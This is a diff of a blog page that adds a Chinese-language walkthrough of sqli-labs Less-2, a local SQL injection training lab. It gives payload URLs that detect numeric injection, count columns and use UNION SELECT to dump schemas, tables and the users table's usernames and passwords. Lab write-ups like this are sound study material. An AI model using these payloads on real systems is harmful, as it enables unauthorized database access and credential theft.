@@ -312,19 +312,19 @@
 
 
   
-    <article id="post-My-New-Post" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-sqlilab-lesson2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/11/29/My-New-Post/">My New Post</a>
+      <a class="article-title" href="/2021/11/29/sqlilab-lesson2/">My New Post</a>
     </h1>
   
 
         
-        <a href="/2021/11/29/My-New-Post/" class="archive-article-date">
+        <a href="/2021/11/29/sqlilab-lesson2/" class="archive-article-date">
   	<time datetime="2021-11-29T12:43:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-11-29</time>
 </a>
         
@@ -332,7 +332,24 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <h1 id="sqlilab-lesson2"><a href="#sqlilab-lesson2" class="headerlink" title="sqlilab lesson2"></a>sqlilab lesson2</h1><h2 id="less-2：（步骤）"><a href="#less-2：（步骤）" class="headerlink" title="less-2：（步骤）"></a>less-2：（步骤）</h2><h3 id="1、判断是否可注入以及注入类型"><a href="#1、判断是否可注入以及注入类型" class="headerlink" title="1、判断是否可注入以及注入类型"></a>1、判断是否可注入以及注入类型</h3><p>数字型注入（补充）</p>
+<ol>
+<li><p>url为 <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-2/?id=1&#39;%E6%97%B6%EF%BC%8C%E5%9B%A0%E4%B8%BA%E6%9C%89%E4%B8%80%E4%B8%AA%E5%A4%9A%E4%BD%99%E7%9A%84&quot;%E5%8D%95%E5%BC%95%E5%8F%B7&quot;%E4%BD%BF%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E9%94%99%E8%AF%AF">http://127.0.0.1/sqli-labs/Less-2/?id=1&#39;时，因为有一个多余的&quot;单引号&quot;使查询语句错误</a></p>
+</li>
+<li><p>url为 <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-2/?id=1">http://127.0.0.1/sqli-labs/Less-2/?id=1</a> and 1=1时，没有报错</p>
+</li>
+<li><p>url为 <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-2/?id=1">http://127.0.0.1/sqli-labs/Less-2/?id=1</a> and 1=2时，由于1=2不成立，也会报错</p>
+</li>
+</ol>
+<p>满足这三个，基本上就是数字注入了否则则为字符型</p>
+<h3 id="2、判断列数"><a href="#2、判断列数" class="headerlink" title="2、判断列数"></a>2、判断列数</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1">http://127.0.0.1/sqli-labs-master/Less-2/?id=1</a> order by 3–+</p>
+<h3 id="3、判断哪些可回显"><a href="#3、判断哪些可回显" class="headerlink" title="3、判断哪些可回显"></a>3、判断哪些可回显</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1">http://127.0.0.1/sqli-labs-master/Less-2/?id=1</a> union select 1,2,3–+</p>
+<h3 id="4、查看数据库"><a href="#4、查看数据库" class="headerlink" title="4、查看数据库"></a>4、查看数据库</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a> union select 1,2,group_concat(schema_name) from information_schema.schemata–+</p>
+<h3 id="5、查看此库中的所有表"><a href="#5、查看此库中的所有表" class="headerlink" title="5、查看此库中的所有表"></a>5、查看此库中的所有表</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1&#39;</a> union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p>
+<h3 id="6、查看users中的列信息"><a href="#6、查看users中的列信息" class="headerlink" title="6、查看users中的列信息"></a>6、查看users中的列信息</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1&#39;</a> union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+</p>
+<h3 id="7、查看所有字段"><a href="#7、查看所有字段" class="headerlink" title="7、查看所有字段"></a>7、查看所有字段</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a> union select 1,2,group_concat(concat_ws(‘~’,username,password) )from security.users–+</p>
+<p>与练习一类似，不同点在于注入类型的判断</p>
+
       
 
       
@@ -344,7 +361,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/11/29/My-New-Post/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/11/29/sqlilab-lesson2/">展开全文 >></a>
         </p>
       
 
